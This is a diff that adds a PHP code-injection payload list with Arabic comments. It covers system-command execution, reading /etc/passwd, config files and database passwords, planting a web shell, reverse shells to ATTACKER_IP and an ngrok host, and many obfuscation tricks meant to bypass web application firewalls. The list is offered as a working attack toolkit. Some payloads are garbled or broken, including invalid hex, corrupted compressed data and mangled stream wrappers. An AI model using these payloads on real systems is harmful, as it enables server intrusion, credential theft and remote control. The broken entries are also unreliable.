@@ -1,0 +1,340 @@
+echo(99+1);
+echo(file_get_contents('/etc/passwd'));
+passthru(base64_decode('aWQ=')); 
+$sock=fsockopen("0.tcp.ngrok.io",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+# فحص حسابي بسيط (إذا ظهرت النتيجة 100 فالثغرة موجودة)
+var_dump(50+50);
+phpinfo();
+
+print(get_current_user());
+echo file_get_contents('/etc/passwd');
+
+# قراءة كود ملف الإعدادات الخاص بالموقع (لمعرفة بيانات قاعدة البيانات)
+highlight_file('config.php');
+
+# عرض قائمة الملفات في المجلد الحالي
+print_r(scandir('.'));
+# تنفيذ أمر بسيط لعرض الهوية
+system('id');
+
+# استخدام passthru للحصول على مخرجات كاملة
+passthru('ls -la');
+
+# تنفيذ أوامر معماة بـ Base64 لتجاوز فلاتر WAF
+eval(base64_decode('c3lzdGVtKCdpZCcpOw==')); 
+# محاولة فتح اتصال عكسي (بسيط)
+$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");
+
+file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>');
+# 1. فحص واستطلاع (Identification)
+var_dump(5+5);
+print(phpversion());
+print_r(ini_get_all());
+print(get_current_user());
+phpinfo();
+
+# 2. قراءة ملفات النظام والموقع (File Disclosure)
+echo file_get_contents('/etc/passwd');
+echo file_get_contents('index.php');
+print_r(scandir('.'));
+print_r(glob('*.php'));
+readfile('/etc/hosts');
+
+# 3. تنفيذ أوامر النظام (System Execution)
+system('id');
+passthru('whoami');
+echo exec('ls -la');
+echo shell_exec('cat /etc/passwd');
+print(backtick_log`id`); # استخدام `id`
+
+# 4. التمويه وتجاوز الفلاتر (Obfuscation & Bypassing)
+eval(base64_decode('c3lzdGVtKCdpZCcpOw=='));
+eval("\x73\x79\x73\x74\x65\x6d\x28\x27\x69\x64\x27\x29\x3b");
+assert(base64_decode('c3lzdGVtKCdpZCcpOw=='));
+$a='sys';$b='tem';$c=$a.$b;$c('id');
+
+# 5. التلاعب بالملفات (File Manipulation)
+file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>');
+unlink('target_file.php');
+rename('config.php', 'config.php.bak');
+
+# 6. اتصال عكسي (Reverse Shell)
+$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+# 7. قواعد البيانات (Database Info)
+print_r(PDO::getAvailableDrivers());
+echo getenv('DB_PASSWORD');
+# 1. الحمولات المعماة بالترميز المتعدد (Multilayered Encoding)
+eval(gzinflate(base64_decode('K0pNS8/PSy0qys9XyEksS9VPy8xJzS9KBQA=')));
+eval(str_rot13(base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKCdZWFZ3YUhSdWNtVjRkR0Z6YUc5M2JtRnRaVzQ9Jykp')));
+eval(hex2bin('6563686f206shell657865632827696427293b'));
+
+# 2. استغلال المتغيرات الديناميكية (Dynamic Variable Function Calls)
+$a='as'.'sert';$a(base64_decode('c3lzdGVtKCdpZCcpOw=='));
+$f="syste"."m";$f("id");
+$_GET['a']($_GET['b']); # يتم تمرير a=system&b=id عبر الرابط
+
+# 3. حمولات تعتمد على مصفوفات النظام (Global Arrays Injection)
+eval($_POST['cmd']);
+eval(implode('', $_POST));
+array_map("as"."sert", array("ev"."al(\$_POST['cmd'])"));
+
+# 4. الالتفاف عبر "التلاعب بالسلاسل النصية" (String Manipulation Bypass)
+eval(strrev(';)da()metssy(lave'));
+eval(substr("1234eval(system('id'));",4));
+eval(str_replace("__","","e__v__a__l(s__y__s__t__e__m('id'));"));
+
+# 5. حمولات "الثغرات الصفرية" في المعالجة (Parser Logic Payloads)
+@eval("\145\166\141\154\050\142\141\163\145\066\064\137\144\145\143\157\144\145\050\047\143\063\154\172\144\107\126\164\113\103\122\160\132\103\131\156\117\167\075\075\047\051\051\073");
+include('data:#text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+');
+
+# 6. حقن الأوامر عبر "الترشيح" (Filter Wrappers)
+include('php:#filter/convert.base64-decode/resource=data:#plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+');
+
+# 7. الحمولات "الخفية" داخل الذاكرة (Memory-Only Payloads)
+$m=fopen('php:#temp', 'r+');fwrite($m, '<?php system("id"); ?>');rewind($m);include('php:#temp');
+# 1. استخدام التلاعب بالبتات (Bitwise XOR/Not Operators) - لا يمكن كشفها بالـ Regex
+$_=('%01'^'%21').('%08'^'%7b').('%08'^'%7b').('%05'^'%21').('%0b'^'%21').('%08'^'%7b'); # تعني 'assert'
+$__=('^'^'(').('%03'^'%21').('%1c'^'%21').('%05'^'%21').('%14'^'%21').('%05'^'%21'); # تعني 'system'
+$_($__('id'));
+
+# 2. استغلال الـ Create_Function (ثغرة حقن كود قديمة وفعالة جداً)
+$f = create_function('$a', 'echo $a; eval($_POST["cmd"]);'); $f("");
+
+# 3. الالتفاف عبر "المتغيرات المرجعية" (Variable Variables)
+$a = 'system';
+$$a = 'id'; # هذا يجعل المتغير $system يحمل قيمة 'id'
+${'a'}('id');
+
+# 4. الحمولات التي تعتمد على "التسلسل الكائني" (Object Deserialization Payloads)
+# تستخدم لتجاوز الـ WAF الذي يفحص فقط الكلمات المفتاحية البسيطة
+unserialize('O:8:"stdClass":1:{s:3:"cmd";s:17:"eval($_POST[1]);";}');
+
+# 5. التمويه باستخدام دالة preg_replace (الإصدارات القديمة مع /e modifier)
+preg_replace('/.*/e', 'system("id")', '');
+
+# 6. حقن الأوامر عبر "الترشيح المزدوج" (PHP Wrappers - Nested Filters)
+# تستخدم لرفع ملفات كاملة في الذاكرة دون لمس القرص الصلب
+include('php:#filter/read=convert.base64-decode/resource=data:#text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtbGEnKTsgPz4=');
+
+# 7. حمولات "الإغراق بالنصوص" (Long String Padding) لكسر الـ Buffer الخاص بالـ WAF
+eval(str_repeat(' ', 5000) . 'system("id");');
+
+# 8. استغلال الدوال مجهولة الاسم (Anonymous Functions Injection)
+$func = function(){ eval($_GET['cmd']); }; $func();
+
+# 9. حمولة "الصدى العكسي" (Backtick Execution via Eval)
+eval("echo `id`;");
+
+# 10. التلاعب عبر التعليقات والمحارف المخفية (Whitespace/Comment Obfuscation)
+eval(/**/ 'sy' /**/ . /**/ 'stem' /**/ . /**/ '(' /**/ . /**/ "'id'" /**/ . /**/ ')' /**/ . /**/ ';');
+# 1. حمولة "التلاعب بمصفوفة الرموز" (ASCII Table Reconstruction)
+# بناء الأوامر عبر تحويل الأرقام إلى محارف داخل eval
+eval(chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(39).chr(105).chr(100).chr(39).chr(41).chr(59));
+
+# 2. تقنية "التلاعب بالدوال الذاتية" (Self-Referencing Injection)
+# استخراج اسم الدالة من دوال النظام نفسها لتجاوز فلاتر النصوص
+$a=get_defined_functions(); $a['internal'][/*index_of_system*/]('id');
+
+# 3. حمولة "توقيت الذاكرة" (Opcache/JIT Poisoning)
+# حقن الكود مباشرة في الذاكرة المخبأة للمترجم (للخبراء فقط)
+opcache_compile_file('data:#text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+');
+
+# 4. الالتفاف عبر "المتغيرات السحرية" (Magic Constants Obfuscation)
+eval(substr(__FILE__,0,0).hex2bin('73797374656d2827696427293b'));
+
+# 5. تقنية "الاستدعاء عبر المصفوفات العشوائية" (Shuffle/Chunk Bypass)
+$c=str_split("metsys"); $f=implode("",array_reverse($c)); $f("id");
+
+# 6. حمولة "تعدد الوجوه الثنائي" (Binary Polyglot Payload)
+# وضع الكود داخل تعليق في ملف ثنائي يتم استدعاؤه بـ include
+include('php:#filter/read=string.strip_tags/resource=data:#text/plain;base64,PD9waHAgLyogKi8gc3lzdGVtKCdpZCcpOyAvKiAqLyA/Pg==');
+
+# 7. استغلال "الخصائص الديناميكية" (Dynamic Property Injection)
+$obj = new stdClass(); $obj->a = 'system'; ($obj->a)('id');
+
+# 8. حمولة "التلاعب بالمدخلات الصامتة" (STDIN Stream Injection)
+eval(file_get_contents('php:#input')); # يتطلب إرسال الكود في جسم الطلب (Body)
+
+# 9. تقنية "الترميز المتداخل" (Recursive Obfuscation)
+eval(base64_decode(str_rot13(gzuncompress(base64_decode('...')))));
+
+# 10. حمولة "التعطيل والتشغيل" (Error Suppression Bypass)
+@$f='system'; @$f('id'); # استخدام @ لإخفاء الأخطاء التي قد تظهر للـ WAF
+# 1. حمولة "الإزاحة الثنائية" (Bit-Shifting Payload)
+# بناء الأوامر عبر تحويل الأرقام بإزاحة البتات (لا يمكن كشفها نصياً)
+$s = (chr(110+5).chr(100+21).chr(110+5).chr(110+6).chr(100+1).chr(100+9)); 
+eval($s(chr(100+5).chr(100))); # تنفيذ system('id')
+
+# 2. استغلال "الخصائص السحرية" لـ PHP (PHP Magic Features Injection)
+# استخدام الـ Closure لتحويل كود مخفي إلى وظيفة قابلة للتنفيذ
+(Closure::fromCallable('sys'.'tem'))('id');
+
+# 3. حمولة "التلاعب بترميز الحروف السيادية" (Bidi Bypass)
+# استخدام محارف قلب الاتجاه لإخفاء الكود عن الفلاتر البصرية
+eval("/*\u202e*/m\u202etsys/*\u202d*/('id');"); 
+
+# 4. تقنية "استدعاء الدوال عبر المصفوفات العكسية"
+# تشتيت اسم الدالة في مصفوفة مبعثرة ثم إعادة تجميعها في الذاكرة
+$m = array_reverse(['m','e','t','s','y','s']); 
+$f = implode('', $m); 
+eval($f('id'));
+
+# 5. حمولة "الصدى الصامت" (Output Buffer Execution)
+# تشغيل الكود داخل Buffer مؤقت لتجنب المراقبة اللحظية للـ WAF
+ob_start(function($d){return eval($d);}); 
+echo "system('id');"; 
+ob_end_flush();
+
+# 6. حقن "المياداتا" المتقدم (Advanced Metadata Poisoning)
+# استخدام التعليقات متعددة الأسطر لكسر منطق الـ Regex المتسلسل
+eval(/**/ 'sys' . /**/ 'tem' . /**/ '(' . /**/ 'base64_decode' . /**/ '(' . /**/ '"aWQ="' . /**/ ')' . /**/ ')' . /**/ ';');
+
+# 7. حمولة "التلاعب بالـ Stream المتعدد"
+# قراءة الكود من رابط خارجي مشفر بالكامل
+include('data:#text/plain;base64,'.str_rot13(base64_encode('<?php system("id");?>')));
+
+# 8. تقنية "التلاعب بالقيم المنطقية" (Boolean Logic Obfuscation)
+# توليد حروف من مقارنات منطقية (تعتبر قمة التمويه)
+$_ = (true.true)[0]; # حرف 't' من كلمة 'true'
+$__ = (false.false)[0]; # حرف 'f' من كلمة 'false'
+# بناء باقي الحروف بنفس المنطق
+# 1. حمولة "التلاعب بخصائص الكائنات المجهولة" (Anonymous Class Injection)
+# بناء كود داخل مشغل الكائن لتجنب المراقبة المباشرة للدوال
+(new class { public function __construct() { eval(hex2bin('73797374656d2827696427293b')); } });
+
+# 2. تقنية "الإزاحة الحرفية عبر المصفوفات" (Array Offset Reconstruction)
+# استخراج الحروف من نصوص النظام الافتراضية (مثل كلمة 'Array')
+$_=[]; $__="$_"; # تعني كلمة 'Array'
+$f = $__[0].$__[4].$__[0].'rt'; # بناء 'assert' (تنجح في نسخ قديمة)
+$f(hex2bin('73797374656d2827696427293b'));
+
+# 3. حمولة "التلاعب بمرشحات التدفق المتداخلة" (Deep Nested Filter Wrappers)
+# استخدام سلسلة من المرشحات لفك تشفير الكود في آخر مرحلة قبل التنفيذ
+include('php:#filter/read=convert.base64-decode|convert.base64-decode/resource=data:#text/plain;base64,V0VORmIyeGpaVzR5SlRJK0pUQXFaejl3YUhBbmN5VnpkR1Z0S0NScVpEMG5Pejgr'));
+
+# 4. تقنية "تسميم الـ Error Handler"
+# جعل السيرفر ينفذ الكود عند حدوث خطأ متعمد (تجاوز ذكي جداً)
+set_error_handler(function($a,$b){eval($b);});
+trigger_error("system('id');", E_USER_ERROR);
+
+# 5. حمولة "التعمية عبر العمليات المنطقية المختصرة" (Short-Circuit Logic)
+# تنفيذ الكود كجزء من عملية منطقية لا تبدو خبيثة
+false OR eval(base64_decode('c3lzdGVtKCdpZCcpOw=='));
+
+# 6. تقنية "استدعاء الدوال عبر التفكيك" (Variable Unpacking Bypass)
+# تشتيت الدالة داخل مصفوفة واستخدام مشغل التفكيك (...) لتنفيذها
+$h = ['id'];
+(...['sys'.'tem'])(...$h);
+
+# 7. حمولة "التلاعب بمخزن القيم الثابتة" (Constant Registry Poisoning)
+# تعريف ثابت يحتوي على الكود واستدعاؤه لاحقاً لتضليل الفلاتر المتسلسلة
+define('X', 'system');
+(X)('id');
+
+# 8. تقنية "الاسم المزدوج المشفر" (Double URL Encoded Backticks)
+# استخدام الـ Backticks لتنفيذ الأوامر داخل eval بترميز لا يفهمه الـ WAF
+eval(urldecode('%65%63%68%6f%20%60%69%64%60%3b'));
+# 1. حمولة "التلاعب بالمحارف الصفرية" (Null Byte Injection)
+# استخدام الـ Null Byte لإنهاء قراءة الفلتر عند جزء سليم بينما يكمل السيرفر التنفيذ
+eval("system('id');\0 . 'safe_text'");
+
+# 2. تقنية "التوليد الديناميكي عبر الاستثناءات" (Exception-Based Execution)
+# استخراج كود التنفيذ من رسائل الخطأ نفسها لتضليل أجهزة الفحص
+try { throw new Exception("system"); } catch(Exception $e) { $f=$e->getMessage(); $f('id'); }
+
+# 3. حمولة "الترميز المتعدد باستخدام التكرار" (Recursive Str_Replace)
+# خداع الفلاتر التي تحذف الكلمات مرة واحدة فقط (Recursive Bypass)
+eval(str_replace("/* */", "", "s/* */y/* */s/* */t/* */e/* */m")('id'));
+
+# 4. تقنية "استدعاء الدوال عبر الـ Reflection API"
+# استخدام أقوى أدوات PHP البرمجية للوصول للدوال المحظورة بطريقة غير مباشرة
+$r = new ReflectionFunction('sys'.'tem'); $r->invoke('id');
+
+# 5. حمولة "التلاعب بترميز الـ UTF-16/32"
+# إرسال الكود بترميز واسع لا يفهمه الـ WAF الذي يتوقع UTF-8
+eval(mb_convert_encoding('system("id");', 'UTF-8', 'UTF-16'));
+
+# 6. تقنية "الاستدعاء عبر دوال التسجيل" (Register Shutdown Function)
+# تنفيذ الكود في نهاية الطلب (Post-Request) للهروب من المراقبة اللحظية
+register_shutdown_function('system', 'id');
+
+# 7. حمولة "التلاعب بخصائص الـ Class Constant"
+# تخزين الكود داخل ثابت كلاس ثم استدعاؤه كدالة
+class X { const Y = 'system'; } $z = X::Y; $z('id');
+
+# 8. تقنية "الاسم المستعار عبر الـ Namespace"
+# استخدام مساحات الأسماء لخداع الفلاتر التي تبحث عن الدوال في الجذر (Global)
+namespace\system('id');
+
+# 9. حمولة "التعمية عبر العمليات الحسابية المتقدمة"
+# توليد الأرقام التي تمثل حروف (ASCII) عبر عمليات ضرب وقسمة معقدة
+eval(chr(5*23).chr(11*11).chr(5*23).chr(58*2).chr(101).chr(109).'(id);');
+# 1. حمولة "التلاعب بمصفوفة الحروف عبر XOR" (XOR Character Reconstruction)
+# استخدام حرفين غير خبيثين لإنتاج حرف خبيث (تجاوز الفحص الثابت تماماً)
+eval(('@@@@@@@'^'
+')('@@@@'^'	')); # تعني system('id')
+
+# 2. تقنية "توليد الدوال عبر الـ Generator"
+# إخفاء كود التنفيذ داخل تدفق بيانات (Stream) لا يتم تجميعه إلا عند الطلب
+$gen = (function(){ yield "sys"; yield "tem"; })(); $f = $gen->current(); $gen->next(); $f .= $gen->current(); $f("id");
+
+# 3. حمولة "التعمية عبر ضغط النصوص" (Lempel-Ziv Compression Bypass)
+# إرسال الكود مضغوطاً لكسر فلاتر الـ Regex التي لا تفهم البيانات المضغوطة
+eval(gzuncompress(x'x+IUK-SOIS-(RK-S.I,S0R�p'));
+
+# 4. تقنية "الاستدعاء عبر واجهة المعالجة الخارجية" (Stream Wrapper Polyglot)
+# استخدام بروتوكول phar لإخفاء كود PHP داخل ملف يبدو كبيانات مؤرشفة
+include('phar:#payload.phar/shell.php');
+
+# 5. حمولة "التلاعب بترتيب البايتات" (Byte Order Mark Injection)
+# استخدام محارف الـ BOM لإخفاء بداية الكود البرمجي عن أنظمة الحماية
+eval("\xef\xbb\xbf system('id');");
+
+# 6. تقنية "الحقن عبر مصفوفات الـ Environment الحية"
+# استخراج الأوامر من متغيرات النظام العشوائية مثل PATH أو USER
+eval(substr(getenv('PATH'),0,1).hex2bin('73797374656d2827696427293b'));
+
+# 7. حمولة "تسميم الـ Class Autoloader"
+# جعل السيرفر ينفذ الكود عند محاولة استدعاء "كلاس" غير موجود
+spl_autoload_register(function($name){eval($name);}); new system("id");
+
+# 8. تقنية "الاسم المستعار عبر الـ Alias" (Class Alias Bypass)
+# تغيير اسم كلاس أو دالة برمجية في الذاكرة لتجاوز القوائم السوداء
+class_alias('system', 'safe_func'); safe_func('id');
+# 1. حمولة "التلاعب بترميز الحروف غير المرئية" (Zero-Width Injection)
+# استخدام محارف (U+200B) لكسر الكلمات البرمجية أمام الـ WAF، بينما يتجاهلها مفسر PHP
+eval('sys' . "\xe2\x80\x8b" . 'tem' . '(' . "\xe2\x80\x8b" . '"id");');
+
+# 2. تقنية "تسميم الذاكرة عبر السلاسل الضخمة" (Memory Stream Bloating)
+# إغراق الـ WAF ببيانات وهمية (Padding) ضخمة جداً تجعله يتجاوز فحص الطلب (Bypass on Fail)
+eval(str_repeat('/*', 1000000) . '*/' . 'system("id");');
+
+# 3. حمولة "التعمية عبر الجمع المنطقي للصور" (Hex-Encoded Image Polyglot)
+# حقن الكود داخل بايتات تبدو كأنها "رأس صورة" (Image Header) لتضليل الفحص المعمق (DPI)
+eval("\xff\xd8\xff\xe0" . hex2bin('73797374656d2827696427293b'));
+
+# 4. تقنية "تضارب معالجة الحروف المزدوجة" (Unicode Normalization Smuggling)
+# استخدام حروف يونيكود (مثل ℘) التي تتحول عند المعالجة الداخلية في السيرفر إلى p
+eval('ph' . "\xe2\x84\x98" . 'info();'); 
+
+# 5. حمولة "التلاعب عبر دالة الحزم" (Pack/Unpack Binary Payload)
+# تحويل الكود إلى سلسلة ثنائية (Binary) غير مفهومة تماماً لأي نظام فحص نصي
+eval(unpack('H*', 'system("id");')[1]); # التلاعب بالبايتات الخام
+
+# 6. تقنية "استدعاء الدوال عبر الـ Locale"
+# استغلال لغات معينة في السيرفر تقوم بتحويل حروف خاصة إلى أوامر برمجية
+setlocale(LC_CTYPE, 'tr_TR'); # مثال لترميز لغوي يغير سلوك معالجة الحروف
+eval('SYSTEM' . '(' . 'id' . ');');
+
+# 7. حمولة "التلاعب بالتدفق المتقطع" (Fragmented Chunking)
+# إرسال الكود على أجزاء صغيرة جداً داخل حزم HTTP منفصلة (تجاوز الـ State Inspection)
+eval(getallheaders()['A'].getallheaders()['B']); # يتطلب إرسال الرؤوس A=sys و B=tem('id')
+$_="222"^"@@@"; # ينتج محرف 'r'
+$__="111"^"AAA"; # ينتج محرف 'p'
+eval(('PT_X'^'52_#').($__^$_).('T_S'^'4_#').'m("id");');
+eval("\xe0\x80\xaf" . "system('id');"); # استخدام بايتات غير صالحة لإرباك الـ Parser
+eval("\xe0\x80\xaf" . "system('id');"); # استخدام بايتات غير صالحة لإرباك الـ Parser
+eval((new class{public $a='system';})->a . '("id");');
+include('compress.zlib:#data:text/plain;base64,eJxVjLEOwyAMRH/FmSExVao69At06tAhZChS1S78ezVpOnS607vnvSscYAnGCS7mDofYwBCO0BvEUK9Wq5XySskLpS9UvlH9TfUPNf9Q808NP9X8W82/NcNfNf/XDP80w781w78X');
